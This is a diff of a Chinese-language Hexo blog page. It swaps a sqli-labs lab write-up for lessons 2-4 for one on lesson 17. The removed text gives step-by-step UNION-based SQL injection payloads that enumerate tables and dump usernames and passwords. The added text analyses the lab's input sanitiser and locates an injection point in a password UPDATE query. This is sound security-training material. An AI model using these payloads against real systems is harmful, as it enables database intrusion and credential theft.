@@ -5,20 +5,22 @@
   
 
   
-  <title>lesson2，lesson3，lesson4 | Hexo</title>
+  <title>lesson17- | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一.找注入点由题目提示：注入点为整数。 试探：输入?id&#x3D;1返回正常；输入?id&#x3D;0返回异常；且输入?id&#x3D;0 or 1&#x3D;1–+得到的返回值正确。故该处存在sql注入点。 二.判断字段数 输入?id&#x3D;1 order by n–+直到输入n&#x3D;4时返回错误。故数据库中存在3个字段。 三.爆开数据库：得到数据库名 输入?id&#x3D;0 uion select 1,2,database()–+语句 四.爆开数据">
+  <meta name="description" content="lesson17：这一关不管我们在username上构造什么payload都无法篡改数据库。 我们查看源码： 1234567891011121314151617181920212223242526function check_input($value)	&amp;#123;	if(!empty($value))		&amp;#123;		&#x2F;&#x2F; truncation (see comments)		$value &#x3D;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lesson2，lesson3，lesson4">
-<meta property="og:url" content="http://example.com/2020/11/16/blog%20d/index.html">
+<meta property="og:title" content="lesson17-">
+<meta property="og:url" content="http://example.com/2021/01/31/17-/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一.找注入点由题目提示：注入点为整数。 试探：输入?id&#x3D;1返回正常；输入?id&#x3D;0返回异常；且输入?id&#x3D;0 or 1&#x3D;1–+得到的返回值正确。故该处存在sql注入点。 二.判断字段数 输入?id&#x3D;1 order by n–+直到输入n&#x3D;4时返回错误。故数据库中存在3个字段。 三.爆开数据库：得到数据库名 输入?id&#x3D;0 uion select 1,2,database()–+语句 四.爆开数据">
+<meta property="og:description" content="lesson17：这一关不管我们在username上构造什么payload都无法篡改数据库。 我们查看源码： 1234567891011121314151617181920212223242526function check_input($value)	&amp;#123;	if(!empty($value))		&amp;#123;		&#x2F;&#x2F; truncation (see comments)		$value &#x3D;">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-11-16T14:04:05.000Z">
-<meta property="article:modified_time" content="2021-01-30T14:48:16.341Z">
+<meta property="og:image" content="http://example.com/2021/01/31/17-/1.png">
+<meta property="article:published_time" content="2021-01-31T13:26:30.000Z">
+<meta property="article:modified_time" content="2021-02-01T12:31:54.088Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sqlilabs">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/01/31/17-/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -67,10 +69,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-blog d" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-17-" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/16/blog%20d/" class="article-date">
-  <time datetime="2020-11-16T14:04:05.000Z" itemprop="datePublished">2020-11-16</time>
+    <a href="/2021/01/31/17-/" class="article-date">
+  <time datetime="2021-01-31T13:26:30.000Z" itemprop="datePublished">2021-01-31</time>
 </a>
     
   </div>
@@ -81,7 +83,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      lesson2，lesson3，lesson4
+      lesson17-
     </h1>
   
 
@@ -89,25 +91,31 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="一-找注入点"><a href="#一-找注入点" class="headerlink" title="一.找注入点"></a>一.找注入点</h4><p>由题目提示：注入点为整数。</p>
-<p>试探：输入?id=1返回正常；输入?id=0返回异常；且输入?id=0 or 1=1–+得到的返回值正确。故该处存在sql注入点。</p>
-<p>二.判断字段数</p>
-<p>输入?id=1 order by n–+直到输入n=4时返回错误。故数据库中存在3个字段。</p>
-<p>三.爆开数据库：得到数据库名</p>
-<p>输入?id=0 uion select 1,2,database()–+语句</p>
-<p>四.爆开数据表：得到数据表名</p>
-<p>输入?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+语句。</p>
-<p>注：table_schema=database()赋值语句，即列出数据库中的表名</p>
-<p>五.爆开数据列：得到数据列名</p>
-<p>输入?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+语句</p>
-<p>六.爆开数据值</p>
-<p>输入?id=0 union select 1,group_concat(username,0x3a,password),3 from users–+语句。</p>
-<p>七.总结：lesson1—4的爆库方法基本一致，只有在注入点上略有不同。</p>
+        <h1 id="lesson17："><a href="#lesson17：" class="headerlink" title="lesson17："></a>lesson17：</h1><p>这一关不管我们在username上构造什么payload都无法篡改数据库。</p>
+<p>我们查看源码：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先认识一下陌生函数：</p>
+<p>1.get_magic_quotes_gpc()函数<br>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。</p>
+<p>注：开启magic_quotes_gpc=on之后，能实现addsIshes()和stripslashes()这两个函数的功能。在PHP4.0及以上的版本中，该选项默认情况下是开启的，所以在PHP4.0及以上的版本中，就算PHP程序中的参数没有进行过滤，PHP系统也会对每一个通过GET、POST、COOKIE方式传递的变量自动转换，换句话说，输入的注入攻击代码将会全部被转换，将给攻击者带来非常大的困难。</p>
+<p>2.addslashes()函数<br>addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\的字符串。</p>
+<p>3.stripslashes()函数</p>
+<p>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
+<p>注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。</p>
+<p>4.ctype_digit()函数<br>ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
+<p>5.mysql_real_escape_string()函数</p>
+<p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/2021/01/31/17-/1.png" alt="1"></p>
+<p><strong>sp：</strong>怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。</p>
+<p>由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以我们观察源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现可以从password下手。</p>
+<p>输入username=root ；password=root’，页面报sql语法错误，确定注入点为：’  ;</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/16/blog%20d/" data-id="ckkcnrnez00032ovu3uvkdqdk" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/31/17-/" data-id="ckkmk037o0000i8vu8lfs0abu" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -118,19 +126,19 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/11/20/blog%20e/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/02/01/blogk/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          lesson5&amp;lesson6
+          blogk
         
       </div>
     </a>
   
   
-    <a href="/2020/11/14/blog%20c/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/01/30/lesson11-16/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">lesson1</div>
+      <div class="article-nav-title">lesson11</div>
     </a>
   
 </nav>
